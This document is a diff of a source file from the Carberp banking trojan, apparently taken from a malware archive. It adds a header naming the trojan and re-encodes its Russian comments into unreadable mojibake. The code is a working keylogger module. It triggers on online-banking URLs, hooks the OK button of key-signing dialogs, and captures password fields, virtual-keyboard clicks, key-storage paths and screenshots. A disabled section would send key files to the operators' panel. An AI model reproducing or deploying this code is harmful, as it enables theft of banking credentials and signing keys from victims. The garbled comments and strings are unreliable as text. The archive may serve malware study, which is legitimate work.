@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "GetApi.h"
 #include "Strings.h"
 #include "Memory.h"
@@ -17,27 +28,27 @@ namespace DBGINISTWEB
 
 #define DBGINIST DBGINISTWEB::DBGOutMessage<>
 
-#define InistWebModule //говорим что модуль включен
+#define InistWebModule //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 namespace InistWeb
 {
 	char InistSystemName[] = "inist";
-	PKlgWndFilter filterAll = 0; //фильтр который кейлогит все события
+	PKlgWndFilter filterAll = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR InistCaptions[] = {
-		"*егистрация пользователя*",
-		"Подпись данных",
-		"Подпись и шифрование",
+		"*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*",
+		"пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ",
+		"пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ",
 		NULL};
 
 	char ClassNameComboBox[] = "Combobox";
 	char ClassNameEdit[] = "Edit";
 
 
- /*	PList hashKeys = 0; //список ключей которые уже сохранили
+ /*	PList hashKeys = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	CRITICAL_SECTION csHashKeys;
 
-	//true - если файл является файлом ключем, а также отсылает его в админку
+	//true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int IsFileKey( FileGrabber::ParamEvent* e )
 	{
 		if( e->data )
@@ -45,7 +56,7 @@ namespace InistWeb
 			char c = ((char*)e->data)[0];
 			if( c >= '0' && c <= '9' )
 			{
-				//смотрим добавляли ли уже найденный ключ
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
 				bool exists = true;
 				pEnterCriticalSection(&csHashKeys);
@@ -94,14 +105,14 @@ namespace InistWeb
 
 	void WINAPI InistURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	{
-		// Сменился активный адрес браузера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		char Mask[] = "https://*/ibc";
 		PCHAR URL = (PCHAR)Data;
 
 		bool IsInist = CompareUrl(Mask, URL);
 		if (IsInist)
 		{
-        	// Активируем систему
+        	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			PKeyLogSystem S = KeyLogger::SystemByName(InistSystemName);
 			if (S != NULL)
 				KeyLogger::ActivateSystem(S);
@@ -112,29 +123,29 @@ namespace InistWeb
 
 	bool MakeLog(HWND ParentWnd)
 	{
-		// Формируем лог
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		if (ParentWnd == NULL)
 			return false;
 
-		// Определяем редактор ввода директории
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 		HWND PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, ClassNameComboBox, 0 );;
 
 
-		// Ище второй комбобокс или первый едит
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (PathWnd != NULL)
 			PathWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, ClassNameComboBox, 0 );
 		else
 			PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, ClassNameEdit, 0 );
 
-		//Ище окно ввода пароля
+		//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		HWND PassWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, ClassNameEdit, 0 );
 
 
 		if (PathWnd == NULL || PassWnd == NULL)
 			return false;
 
-		// Добавляем директорию
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR Path = NULL;
 		DWORD Len = (DWORD)pSendMessageA(PathWnd, WM_GETTEXTLENGTH, 0, 0);
 		if (Len != 0)
@@ -149,21 +160,21 @@ namespace InistWeb
 				StrConcat(Path, "\\");
 		}
 
-		DBGINIST( "Inist", "Проверяем хранилище ключей %s", Path);
+		DBGINIST( "Inist", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", Path);
 
-		// Проверяем правильность папки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		bool Valid = (DWORD)pGetFileAttributesA(Path) != INVALID_FILE_ATTRIBUTES;
 		if (Valid)
 		{
-        	// ОГраничиваем аксимальный разер данных
+        	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			DWORD FolderSize = 0;
 			Valid = SizeFolderLess(Path, 1024*1024*5, &FolderSize);
 		}
 
 		if (Valid)
-			DBGINIST( "Inist", "Хранилище успешно прошло проверку" );
+			DBGINIST( "Inist", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		else
-        	DBGINIST( "Inist", "Хранилище ключей отсутствует либо слишком большое" );
+        	DBGINIST( "Inist", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 
 		if (Valid)
 		{
@@ -194,27 +205,27 @@ namespace InistWeb
 
   	//------------------------------------------------------------------------
 
-	// Функия обработки сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 	{
 
 		if (Msg->message == WM_LBUTTONUP)
 		{
-			// Отлавливаем нажатие пользователя на кнопке Ok
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Ok
 			DWORD ID = (DWORD)pGetWindowLongPtrA(Msg->hwnd, GWL_ID);
 			if (ID == 1)
 			{
-				// Нажата кнопка "Ok"
+				// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ "Ok"
 
 				HWND Parent = (HWND)pGetParent(Msg->hwnd);
 				if (!KeyLogger::IsWindowDialog(Parent)) return;
 
-				// В данном случае возможно два варианта - нажата кнопка Ok
-				// На главном диалоге, либо нажата кнопка Ввод на диалоге
-				// ввода виртуальной клавиатуры
-				// По этому проверяем какой диалог был инициатором сообщения
-				// Если это диалог виртуальной клавиатуры, то определяем
-				// основной диалог
+				// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Ok
+				// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 				PKeyLogSystem S = KeyLogger::SystemByName(InistSystemName);
 				if (S == NULL) return;
@@ -222,8 +233,8 @@ namespace InistWeb
 				PKlgWndFilter F = (PKlgWndFilter)List::GetItem(S->Filters, 0);
 				if (F->DialogWnd != Parent)
 				{
-					// Это нажатие на виртуальной клавиатуре
-					// Ищем, основной диалог
+					// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+					// пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 					for (DWORD i = 0; InistCaptions[i] != NULL; i++ )
 					{
 						Parent = (HWND)pFindWindowA(NULL, InistCaptions[i]);
@@ -252,7 +263,7 @@ namespace InistWeb
 	void OnGetLogWnd(LPVOID Sender, HWND &LogWnd)
 	{
 		TKlgWndFilter* filter = (TKlgWndFilter*)Sender;
-		//ищет контрол ввода пароля
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		HWND parent = (HWND)pGetParent(filter->DialogWnd);
 		HWND PassWnd = (HWND)pFindWindowExA( parent, 0, "EDIT", 0 );
 		LogWnd = (HWND)pFindWindowExA( parent, PassWnd, "EDIT", 0 );
@@ -271,15 +282,15 @@ namespace InistWeb
 			#ifdef DEBUGCONFIG
 				S->TimeValue   = 1*60;
 			#else
-				S->TimeValue   = 5*60; // Система будет работать не мение 5-ти минут
+				S->TimeValue   = 5*60; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 5-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			#endif
 			S->MakeScreenShot = true;
 			S->OnMessage = OnMessage;
 //			S->OnActivate = Activeted;
 			S->OnDeactivate = Deactiveted;
 
-			//первый символ P в Caption может быть латинским или русским
-			char KeyboardCaption[] = {'*','в','и','р','т','у','а','л','ь','н','*','к','л','а','в','и','а','т','у','р','*', 0};
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ P пїЅ Caption пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			char KeyboardCaption[] = {'*','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','*','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','*', 0};
             char ClassName[] = "#*";
 
 			PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, InistCaptions[0], FILTRATE_PARENT_WND, LOG_ALL, 3);
@@ -291,7 +302,7 @@ namespace InistWeb
 				KeyLogger::AddFilterText(F1, NULL, InistCaptions[1]);
 				KeyLogger::AddFilterText(F1, NULL, InistCaptions[2]);
 
-                // Добавляем фильтр виртуальной клавиатуры
+                // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, false, ClassName, KeyboardCaption, FILTRATE_PARENT_WND, LOG_MOUSE, 3);
 				if (F2 != NULL)
 				{
@@ -304,7 +315,7 @@ namespace InistWeb
 
 		}
 
-		//Устанавливаем событие на смену урла в ИЕ
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ
 		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, InistURLChanged);
 
 	}
